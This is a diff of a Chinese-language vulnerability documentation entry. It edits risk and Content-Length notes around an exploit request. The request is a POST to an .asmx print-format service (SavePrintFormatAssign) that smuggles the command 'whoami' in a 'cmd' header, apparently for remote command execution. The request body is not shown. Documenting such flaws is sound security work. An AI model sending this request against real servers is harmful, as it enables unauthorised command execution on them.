@@ -41,7 +41,7 @@ schema_version: "1"
 
 ## 操作风险
 
-命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -61,6 +61,7 @@ schema_version: "1"
 POST /cwbase/service/rps/xtdysrv.asmx HTTP/1.1
 Host: 
 Content-Type: text/xml; charset=utf-8
+Content-Length: length
 cmd: whoami
 SOAPAction: "http://tempuri.org/SavePrintFormatAssign"
 
@@ -78,7 +79,7 @@ SOAPAction: "http://tempuri.org/SavePrintFormatAssign"
 </soap:Envelope>
 ```
 
-> 请求长度说明：原资料 Content-Length 为 length；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 length；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 > 原文: <https://www.yuque.com/xiaokp7/ocvun2/oro7nh02gg79zwah>
